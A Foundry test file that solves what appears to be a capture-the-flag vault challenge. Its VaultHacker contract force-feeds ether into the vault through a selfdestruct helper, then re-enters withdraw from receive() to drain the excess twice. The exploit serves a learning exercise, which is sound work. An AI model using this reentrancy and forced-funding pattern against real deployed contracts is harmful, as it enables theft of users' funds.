// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../contracts/Vault.sol";

contract VaultTest is Test {
    Vault public vault;
    VaultHacker public hacker;
    address deployer = address(10);
    address player = address(1000);

    function setUp() public {
        vm.startPrank(deployer);
        vm.deal(deployer, 1 ether);
        vault = new Vault{value: deployer.balance}();

        vm.deal(deployer, 1 ether);
        //Create hacker and fund it with 1 ether. I sent the vault and the player as parameter to have this information from the beggining

        hacker = new VaultHacker{value: deployer.balance}(address(vault), address(player));
        
        vm.stopPrank();
    }

    function test_hack() public {
        vm.startPrank(player);
        vm.deal(player, 2000 gwei);

        //Mint tokens to the players and approve the hacker to use them.
        vault.mint{value: 2000 gwei}(2000 gwei, player);
        vault.approve(address(hacker), 2000 gwei);

        //Do the magic
        hacker.attack();
        vm.stopPrank();

        //Validate the result.
        vault.captureTheFlag(address(hacker));
        assertEq(vault.flagHolder(), address(hacker));
    }
}


contract VaultHacker {

    Vault public vault;
    address public player;
    Funder public funder;
    bool private hacked;

    constructor (address _vault, address _player) payable {
        player = _player;
        vault = Vault(_vault);
        
        //Create an extra contract to forcing the sent of ether
        funder = new Funder();
    }

    function attack() public {
        //Fund Vault contract balance with 1 extra ether.
        funder.fundAddress{value: 1 ether}(address(vault));
        //Remove the half of the player deposits. Please referr to receive() method to the second part of the hack logic
        vault.withdraw(1000 gwei, address(this), player);
        //Send the balance to the player.
        Address.sendValue(payable(player), address(this).balance);
    }

    receive() external payable {
        //When vault send us the amount of the withdraw, we call again this method to get the ETH's excess twice
        if (!hacked) {
            hacked = true;
            //Ask again to withdram so excess eth is again q ether and we get all of them!!!
            vault.withdraw(1000 gwei, address(this), player);
        }
    }
}

contract Funder {

    //Force funding of the address. 
    function fundAddress(address anAddress) public payable{
        selfdestruct(payable(anAddress));
    }
}
